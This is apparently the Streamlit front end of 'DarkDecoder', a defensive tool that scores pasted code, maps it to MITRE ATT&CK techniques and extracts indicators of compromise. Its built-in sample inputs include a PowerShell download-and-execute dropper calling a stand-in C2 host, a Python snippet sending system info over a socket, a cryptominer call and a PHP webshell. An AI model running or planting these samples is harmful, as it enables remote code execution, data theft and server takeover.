import streamlit as st
import json
import hashlib
import datetime
from analyzer import analyze_code

st.set_page_config(
    page_title="DarkDecoder",
    page_icon="💀",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;400;700&display=swap');

* { box-sizing: border-box; }
html, body, [class*="css"], .stApp {
    background: #020b06 !important;
    color: #00ff41 !important;
    font-family: 'Share Tech Mono', monospace !important;
}
#MainMenu, footer, header { visibility: hidden; }
.block-container { padding: 1rem 2rem 2rem !important; max-width: 100% !important; }

.stApp::before {
    content: '';
    position: fixed; top: 0; left: 0;
    width: 100%; height: 100%;
    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,65,0.015) 2px, rgba(0,255,65,0.015) 4px);
    pointer-events: none; z-index: 9999;
}

/* sidebar */
[data-testid="stSidebar"] {
    background: #000d03 !important;
    border-right: 1px solid #00ff4120 !important;
}
[data-testid="stSidebar"] * { color: #00ff41 !important; font-family: 'Share Tech Mono', monospace !important; }

.stTextArea textarea {
    background: #000d03 !important;
    color: #00ff41 !important;
    font-family: 'JetBrains Mono', monospace !important;
    font-size: 0.82rem !important;
    border: 1px solid #00ff4133 !important;
    border-radius: 0 !important;
    box-shadow: 0 0 12px rgba(0,255,65,0.08) inset !important;
}
.stTextArea textarea:focus {
    border-color: #00ff41 !important;
    box-shadow: 0 0 20px rgba(0,255,65,0.15) inset, 0 0 8px rgba(0,255,65,0.3) !important;
}
.stButton > button {
    background: transparent !important;
    color: #00ff41 !important;
    border: 1px solid #00ff41 !important;
    border-radius: 0 !important;
    font-family: 'Share Tech Mono', monospace !important;
    font-size: 0.9rem !important;
    letter-spacing: 0.1em !important;
    padding: 0.6rem 1rem !important;
    width: 100% !important;
    transition: all 0.15s !important;
    text-transform: uppercase !important;
}
.stButton > button:hover {
    background: #00ff41 !important;
    color: #000 !important;
    box-shadow: 0 0 20px rgba(0,255,65,0.4) !important;
}
.stDownloadButton > button {
    background: #00ff4115 !important;
    color: #00ff41 !important;
    border: 1px solid #00ff4150 !important;
    border-radius: 0 !important;
    font-family: 'Share Tech Mono', monospace !important;
    font-size: 0.8rem !important;
    letter-spacing: 0.1em !important;
    width: 100% !important;
}
.stDownloadButton > button:hover {
    background: #00ff41 !important;
    color: #000 !important;
}
pre { background: #000d03 !important; border: 1px solid #00ff4133 !important; border-radius: 0 !important; }
.stAlert { border-radius: 0 !important; font-family: 'Share Tech Mono', monospace !important; }
</style>
""", unsafe_allow_html=True)

# ── SESSION STATE ──────────────────────────────────────────────────────────
if "history" not in st.session_state:
    st.session_state.history = []

# ── SIDEBAR: History ───────────────────────────────────────────────────────
with st.sidebar:
    st.markdown("""
    <div style="text-align:center;padding:1rem 0 1.5rem;border-bottom:1px solid #00ff4120">
        <div style="font-family:'Orbitron',monospace;font-size:1.1rem;font-weight:900;
                    color:#00ff41;text-shadow:0 0 15px rgba(0,255,65,0.5);letter-spacing:0.1em">
            💀 DARKDECODER
        </div>
        <div style="color:#00ff4150;font-size:0.65rem;letter-spacing:0.2em;margin-top:0.3rem">
            THREAT ANALYSIS ENGINE
        </div>
    </div>
    """, unsafe_allow_html=True)

    st.markdown('<div style="color:#00ff4160;font-size:0.7rem;letter-spacing:0.15em;margin:1.2rem 0 0.7rem">// SCAN HISTORY</div>', unsafe_allow_html=True)

    if not st.session_state.history:
        st.markdown('<div style="color:#00ff4130;font-size:0.78rem">no scans yet</div>', unsafe_allow_html=True)
    else:
        for i, h in enumerate(reversed(st.session_state.history[-8:])):
            score = h["result"].get("danger_score", 0)
            color = "#ff2020" if score >= 8 else "#ff8800" if score >= 6 else "#ffe600" if score >= 4 else "#00ff41"
            cls = h["result"].get("classification", "Unknown")
            ts = h["timestamp"]
            st.markdown(f"""
            <div style="border-left:2px solid {color};padding:0.4rem 0.6rem;
                        margin-bottom:0.5rem;background:#000d03;cursor:pointer">
                <div style="color:{color};font-size:0.78rem;font-weight:700">[{score}/10] {cls}</div>
                <div style="color:#00ff4140;font-size:0.68rem;margin-top:0.1rem">{ts}</div>
            </div>
            """, unsafe_allow_html=True)

    st.markdown('<div style="border-top:1px solid #00ff4115;margin:1rem 0"></div>', unsafe_allow_html=True)
    st.markdown('<div style="color:#00ff4160;font-size:0.7rem;letter-spacing:0.15em;margin-bottom:0.5rem">// SESSION STATS</div>', unsafe_allow_html=True)

    total = len(st.session_state.history)
    critical = sum(1 for h in st.session_state.history if h["result"].get("danger_score", 0) >= 8)
    clean = sum(1 for h in st.session_state.history if h["result"].get("danger_score", 0) <= 2)

    st.markdown(f"""
    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:0.4rem;text-align:center">
        <div style="border:1px solid #00ff4120;padding:0.5rem;background:#000d03">
            <div style="color:#00ff41;font-size:1.2rem;font-family:'Orbitron',monospace">{total}</div>
            <div style="color:#00ff4150;font-size:0.6rem">TOTAL</div>
        </div>
        <div style="border:1px solid #ff202030;padding:0.5rem;background:#000d03">
            <div style="color:#ff2020;font-size:1.2rem;font-family:'Orbitron',monospace">{critical}</div>
            <div style="color:#ff202070;font-size:0.6rem">CRITICAL</div>
        </div>
        <div style="border:1px solid #00ff4120;padding:0.5rem;background:#000d03">
            <div style="color:#00ff41;font-size:1.2rem;font-family:'Orbitron',monospace">{clean}</div>
            <div style="color:#00ff4150;font-size:0.6rem">CLEAN</div>
        </div>
    </div>
    """, unsafe_allow_html=True)

    if st.session_state.history:
        st.markdown('<div style="margin-top:1rem"></div>', unsafe_allow_html=True)
        if st.button("[ CLEAR HISTORY ]", key="clear"):
            st.session_state.history = []
            st.rerun()

# ── HERO ───────────────────────────────────────────────────────────────────
st.markdown("""
<div style="border-bottom:1px solid #00ff4130;padding:1.8rem 0 1.5rem;margin-bottom:1.5rem;text-align:center">
    <div style="font-family:'Orbitron',monospace;font-size:2.8rem;font-weight:900;
                color:#00ff41;text-shadow:0 0 30px rgba(0,255,65,0.6),0 0 60px rgba(0,255,65,0.2);
                letter-spacing:0.15em">
        💀 DARKDECODER
    </div>
    <div style="color:#00ff4180;font-size:0.8rem;letter-spacing:0.3em;margin-top:0.5rem">
        [ AI-POWERED MALICIOUS CODE ANALYSIS ENGINE ]
    </div>
    <div style="display:flex;justify-content:center;gap:2rem;margin-top:1rem;
                color:#00ff4140;font-size:0.72rem;letter-spacing:0.08em">
        <span>▸ DEOBFUSCATION</span>
        <span>▸ MITRE ATT&CK</span>
        <span>▸ IOC EXTRACTION</span>
        <span>▸ THREAT SCORING</span>
        <span>▸ HASH ANALYSIS</span>
        <span>▸ REPORT EXPORT</span>
    </div>
</div>
""", unsafe_allow_html=True)

# ── SAMPLE BUTTONS ─────────────────────────────────────────────────────────
SAMPLES = {
    "ps": ("⚡ PowerShell Dropper",
           'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://malicious-c2.ru/payload.ps1\')"'),
    "py": ("🐍 Python Reverse Shell",
           "import os,socket,base64\nh=base64.b64decode('MTkyLjE2OC4xMDAuNQ==').decode()\np=4444\nd=os.popen('whoami && ipconfig && dir C:\\\\Users').read()\ns=socket.socket()\ns.connect((h,p))\ns.send(d.encode())\ns.close()"),
    "js": ("💰 JS Cryptominer",
           "var miner=new CoinHive.Anonymous('sOmEwAlLeTkEy123',{threads:navigator.hardwareConcurrency,throttle:0.2});\nminer.start();"),
    "php": ("🕸️ PHP Webshell",
            "<?php $k='cmd'; $c=$_POST[$k]; if(!empty($c)){echo '<pre>'.shell_exec($c).'</pre>';} @eval(base64_decode('cGFzc3dvcmQ9InMzY3IzdCI7')); ?>"),
}

st.markdown('<div style="color:#00ff4160;font-size:0.72rem;letter-spacing:0.15em;margin-bottom:0.4rem">▸ LOAD SAMPLE TARGET</div>', unsafe_allow_html=True)
c1, c2, c3, c4 = st.columns(4)
for col, key in zip([c1, c2, c3, c4], SAMPLES):
    with col:
        if st.button(SAMPLES[key][0], key=key):
            st.session_state["sample"] = SAMPLES[key][1]

# ── INPUT ──────────────────────────────────────────────────────────────────
st.markdown('<div style="color:#00ff4160;font-size:0.72rem;letter-spacing:0.15em;margin:0.8rem 0 0.3rem">▸ TARGET CODE // PASTE ANY LANGUAGE</div>', unsafe_allow_html=True)

code_input = st.text_area(
    label="code", label_visibility="collapsed",
    value=st.session_state.get("sample", ""),
    placeholder="// paste obfuscated, weaponized or suspicious code here...",
    height=180,
)

# Live hash preview
if code_input.strip():
    md5 = hashlib.md5(code_input.encode()).hexdigest()
    sha256 = hashlib.sha256(code_input.encode()).hexdigest()
    st.markdown(f"""
    <div style="display:flex;gap:2rem;font-family:'JetBrains Mono',monospace;
                font-size:0.72rem;color:#00ff4150;margin:0.3rem 0 0.7rem;padding:0.4rem 0.6rem;
                border-left:2px solid #00ff4120;background:#000d03">
        <span>MD5: <span style="color:#00ff4180">{md5}</span></span>
        <span>SHA256: <span style="color:#00ff4180">{sha256[:32]}...</span></span>
        <span>SIZE: <span style="color:#00ff4180">{len(code_input.encode())} bytes</span></span>
    </div>
    """, unsafe_allow_html=True)

run = st.button("[ INITIATE SCAN ]", key="run")

# ── ANALYSIS ───────────────────────────────────────────────────────────────
if run:
    if not code_input.strip():
        st.warning("// no target code detected")
    else:
        with st.spinner("// scanning... neural analysis in progress"):
            try:
                result = analyze_code(code_input)
            except Exception as e:
                st.error(f"// scan failed: {e}")
                st.stop()

        # Save to history
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        st.session_state.history.append({
            "timestamp": ts,
            "code_preview": code_input[:60] + "..." if len(code_input) > 60 else code_input,
            "result": result,
            "sha256": hashlib.sha256(code_input.encode()).hexdigest(),
        })

        score = result.get("danger_score", 0)
        if score >= 8:
            sc, sg, label = "#ff2020", "rgba(255,32,32,0.7)", "CRITICAL THREAT"
        elif score >= 6:
            sc, sg, label = "#ff8800", "rgba(255,136,0,0.6)", "HIGH RISK"
        elif score >= 4:
            sc, sg, label = "#ffe600", "rgba(255,230,0,0.5)", "MODERATE"
        else:
            sc, sg, label = "#00ff41", "rgba(0,255,65,0.5)", "LOW / CLEAN"

        fill = int((score / 10) * 20)
        bar = "█" * fill + "░" * (20 - fill)
        sha256_full = hashlib.sha256(code_input.encode()).hexdigest()

        # ── SCORE BANNER ──
        st.markdown(f"""
        <div style="border:1px solid {sc}33;background:#000d03;padding:1.5rem 2rem;
                    margin:1.5rem 0 1rem;display:flex;align-items:center;gap:2rem;
                    box-shadow:0 0 30px {sc}15">
            <div style="text-align:center;min-width:100px">
                <div style="font-family:'Orbitron',monospace;font-size:4.5rem;font-weight:900;
                            color:{sc};text-shadow:0 0 25px {sg};line-height:1">{score}</div>
                <div style="color:{sc};font-size:0.65rem;letter-spacing:0.2em;margin-top:0.2rem">/ 10</div>
            </div>
            <div style="flex:1">
                <div style="color:{sc};font-family:'Orbitron',monospace;font-size:1rem;
                            font-weight:700;letter-spacing:0.2em;margin-bottom:0.4rem">{label}</div>
                <div style="font-family:'JetBrains Mono',monospace;color:{sc};font-size:1rem;margin-bottom:0.4rem">[{bar}]</div>
                <div style="color:#00ff4155;font-size:0.78rem">{result.get('danger_justification','')}</div>
            </div>
            <div style="text-align:right">
                <div style="color:#00ff4150;font-size:0.65rem;letter-spacing:0.12em;margin-bottom:0.3rem">CLASSIFICATION</div>
                <div style="color:#00ff41;font-size:0.85rem;font-family:'Orbitron',monospace;
                            border:1px solid #00ff4133;padding:0.35rem 0.7rem;display:inline-block;margin-bottom:0.5rem">
                    {result.get('classification','UNKNOWN')}
                </div>
                <div style="color:#00ff4140;font-size:0.65rem;font-family:'JetBrains Mono',monospace">
                    SHA256: {sha256_full[:20]}...
                </div>
            </div>
        </div>
        """, unsafe_allow_html=True)

        # ── STATS ROW ──
        iocs = result.get("iocs", {})
        total_iocs = sum(len(v) for v in iocs.values() if isinstance(v, list))
        total_techniques = len(result.get("mitre_techniques", []))
        total_remediations = len(result.get("remediation", []))

        st.markdown(f"""
        <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:0.6rem;margin-bottom:1.2rem">
            <div style="border:1px solid #00ff4120;background:#000d03;padding:0.7rem;text-align:center">
                <div style="color:#00ff41;font-size:1.5rem;font-family:'Orbitron',monospace">{total_iocs}</div>
                <div style="color:#00ff4160;font-size:0.65rem;letter-spacing:0.12em;margin-top:0.2rem">IOCs FOUND</div>
            </div>
            <div style="border:1px solid #1f3fff30;background:#000d03;padding:0.7rem;text-align:center">
                <div style="color:#79b8ff;font-size:1.5rem;font-family:'Orbitron',monospace">{total_techniques}</div>
                <div style="color:#79b8ff60;font-size:0.65rem;letter-spacing:0.12em;margin-top:0.2rem">MITRE TECHNIQUES</div>
            </div>
            <div style="border:1px solid {sc}30;background:#000d03;padding:0.7rem;text-align:center">
                <div style="color:{sc};font-size:1.5rem;font-family:'Orbitron',monospace">{score}/10</div>
                <div style="color:{sc}70;font-size:0.65rem;letter-spacing:0.12em;margin-top:0.2rem">THREAT SCORE</div>
            </div>
            <div style="border:1px solid #00ff4120;background:#000d03;padding:0.7rem;text-align:center">
                <div style="color:#00ff41;font-size:1.5rem;font-family:'Orbitron',monospace">{total_remediations}</div>
                <div style="color:#00ff4160;font-size:0.65rem;letter-spacing:0.12em;margin-top:0.2rem">REMEDIATION STEPS</div>
            </div>
        </div>
        """, unsafe_allow_html=True)

        # ── INTENT ──
        st.markdown(f"""
        <div style="border-left:3px solid {sc};padding:0.7rem 1.1rem;background:#000d03;margin-bottom:1.2rem">
            <div style="color:#00ff4155;font-size:0.65rem;letter-spacing:0.2em;margin-bottom:0.25rem">// DETECTED INTENT</div>
            <div style="color:#e0ffe8;font-size:0.9rem;line-height:1.6">{result.get('intent','N/A')}</div>
        </div>
        """, unsafe_allow_html=True)

        st.markdown('<div style="border-top:1px solid #00ff4115;margin:0.5rem 0 1.2rem"></div>', unsafe_allow_html=True)

        # ── PLAIN ENGLISH + DEOBFUSCATED ──
        col_plain, col_deob = st.columns(2)

        with col_plain:
            st.markdown(f"""
            <div style="border:1px solid #00ff4120;background:#000d03;padding:1.1rem">
                <div style="color:#00ff4155;font-size:0.65rem;letter-spacing:0.2em;margin-bottom:0.6rem">// PLAIN ENGLISH THREAT BRIEF</div>
                <div style="color:#c8ffd4;font-size:0.87rem;line-height:1.75">{result.get('plain_english_summary','N/A')}</div>
            </div>
            """, unsafe_allow_html=True)

        with col_deob:
            st.markdown('<div style="border:1px solid #00ff4120;background:#000d03;padding:1.1rem"><div style="color:#00ff4155;font-size:0.65rem;letter-spacing:0.2em;margin-bottom:0.6rem">// DEOBFUSCATED OUTPUT</div>', unsafe_allow_html=True)
            deob = result.get("deobfuscated_code", "N/A")
            if deob and deob != "N/A":
                st.code(deob, language="python")
            else:
                st.markdown("<div style='color:#00ff4140;font-size:0.82rem'>// no obfuscation layer detected — code is plaintext</div>", unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

        st.markdown('<div style="border-top:1px solid #00ff4115;margin:1.2rem 0"></div>', unsafe_allow_html=True)

        # ── MITRE + IOCs + REMEDIATION ──
        col_m, col_i, col_r = st.columns(3)

        with col_m:
            st.markdown('<div style="border:1px solid #00ff4120;background:#000d03;padding:1.1rem;min-height:260px"><div style="color:#00ff4155;font-size:0.65rem;letter-spacing:0.2em;margin-bottom:0.8rem">// MITRE ATT&CK TECHNIQUES</div>', unsafe_allow_html=True)
            for t in result.get("mitre_techniques", []):
                st.markdown(f"""
                <div style="margin-bottom:0.9rem;padding-bottom:0.8rem;border-bottom:1px solid #00ff4110">
                    <span style="background:#1f3fff22;color:#79b8ff;border:1px solid #1f3fff60;
                                 padding:0.15rem 0.45rem;font-size:0.72rem;font-family:'JetBrains Mono',monospace;margin-right:0.4rem">{t.get('id','')}</span>
                    <span style="color:#e0ffe8;font-size:0.83rem;font-weight:600">{t.get('name','')}</span>
                    <div style="color:#00ff4150;font-size:0.76rem;margin-top:0.25rem;line-height:1.4">{t.get('description','')}</div>
                </div>
                """, unsafe_allow_html=True)
            if not result.get("mitre_techniques"):
                st.markdown("<div style='color:#00ff4130;font-size:0.8rem'>// no techniques mapped</div>", unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

        with col_i:
            st.markdown('<div style="border:1px solid #00ff4120;background:#000d03;padding:1.1rem;min-height:260px"><div style="color:#00ff4155;font-size:0.65rem;letter-spacing:0.2em;margin-bottom:0.8rem">// INDICATORS OF COMPROMISE</div>', unsafe_allow_html=True)
            labels = {"ips":"IP","domains":"DOMAIN","urls":"URL","file_paths":"PATH","registry_keys":"REGISTRY","mutex_names":"MUTEX","other":"OTHER"}
            found = False
            for key, lbl in labels.items():
                items = iocs.get(key, [])
                if items:
                    found = True
                    st.markdown(f"<div style='color:#00ff4145;font-size:0.65rem;letter-spacing:0.12em;margin:0.5rem 0 0.25rem'>{lbl}</div>", unsafe_allow_html=True)
                    for item in items:
                        st.markdown(f"""<div style="font-family:'JetBrains Mono',monospace;color:#ffa657;
                                    background:#3d1f0015;border:1px solid #ffa65730;
                                    padding:0.18rem 0.45rem;font-size:0.76rem;margin-bottom:0.18rem;word-break:break-all">{item}</div>""", unsafe_allow_html=True)
            if not found:
                st.markdown("<div style='color:#00ff4130;font-size:0.8rem'>// no IOCs extracted</div>", unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

        with col_r:
            st.markdown('<div style="border:1px solid #00ff4120;background:#000d03;padding:1.1rem;min-height:260px"><div style="color:#00ff4155;font-size:0.65rem;letter-spacing:0.2em;margin-bottom:0.8rem">// REMEDIATION PROTOCOL</div>', unsafe_allow_html=True)
            for i, step in enumerate(result.get("remediation", []), 1):
                st.markdown(f"""
                <div style="display:flex;gap:0.6rem;margin-bottom:0.8rem;padding-bottom:0.7rem;
                            border-bottom:1px solid #00ff4110;align-items:flex-start">
                    <div style="color:#000;background:#00ff41;min-width:1.3rem;height:1.3rem;
                                display:flex;align-items:center;justify-content:center;
                                font-size:0.7rem;font-weight:700;flex-shrink:0;margin-top:0.1rem">{i:02d}</div>
                    <div style="color:#c8ffd4;font-size:0.82rem;line-height:1.5">{step}</div>
                </div>
                """, unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)

        # ── EXPORT REPORT ──
        st.markdown('<div style="border-top:1px solid #00ff4115;margin:1.2rem 0 1rem"></div>', unsafe_allow_html=True)
        st.markdown('<div style="color:#00ff4155;font-size:0.65rem;letter-spacing:0.2em;margin-bottom:0.6rem">// EXPORT REPORT</div>', unsafe_allow_html=True)

        report = {
            "tool": "DarkDecoder",
            "version": "1.0",
            "timestamp": datetime.datetime.now().isoformat(),
            "sha256": hashlib.sha256(code_input.encode()).hexdigest(),
            "md5": hashlib.md5(code_input.encode()).hexdigest(),
            "code_size_bytes": len(code_input.encode()),
            "analysis": result
        }
        report_json = json.dumps(report, indent=2)

        col_dl1, col_dl2, col_dl3 = st.columns(3)
        with col_dl1:
            st.download_button(
                label="[ ↓ DOWNLOAD JSON REPORT ]",
                data=report_json,
                file_name=f"darkdecoder_{hashlib.md5(code_input.encode()).hexdigest()[:8]}.json",
                mime="application/json",
                key="dl_json"
            )
        with col_dl2:
            txt_report = f"""DARKDECODER THREAT ANALYSIS REPORT
=====================================
Timestamp : {datetime.datetime.now().isoformat()}
SHA256    : {hashlib.sha256(code_input.encode()).hexdigest()}
MD5       : {hashlib.md5(code_input.encode()).hexdigest()}

CLASSIFICATION : {result.get('classification','Unknown')}
DANGER SCORE   : {result.get('danger_score',0)}/10
LABEL          : {label}

INTENT
------
{result.get('intent','N/A')}

PLAIN ENGLISH SUMMARY
----------------------
{result.get('plain_english_summary','N/A')}

DEOBFUSCATED CODE
-----------------
{result.get('deobfuscated_code','N/A')}

MITRE ATT&CK TECHNIQUES
------------------------
""" + "\n".join([f"  [{t.get('id','')}] {t.get('name','')} - {t.get('description','')}" for t in result.get("mitre_techniques",[])]) + "\n\nREMEDIATION STEPS\n-----------------\n" + "\n".join([f"  {i+1}. {s}" for i, s in enumerate(result.get("remediation",[]))])

            st.download_button(
                label="[ ↓ DOWNLOAD TXT REPORT ]",
                data=txt_report,
                file_name=f"darkdecoder_{hashlib.md5(code_input.encode()).hexdigest()[:8]}.txt",
                mime="text/plain",
                key="dl_txt"
            )

        st.markdown("""
        <div style="text-align:center;color:#00ff4225;font-size:0.68rem;letter-spacing:0.2em;
                    padding:1.5rem 0 0.5rem;margin-top:1rem">
            DARKDECODER &nbsp;·&nbsp; BEYOND TOMORROW SUMMIT 2026 &nbsp;·&nbsp; FOR DEFENSIVE PURPOSES ONLY
        </div>
        """, unsafe_allow_html=True)
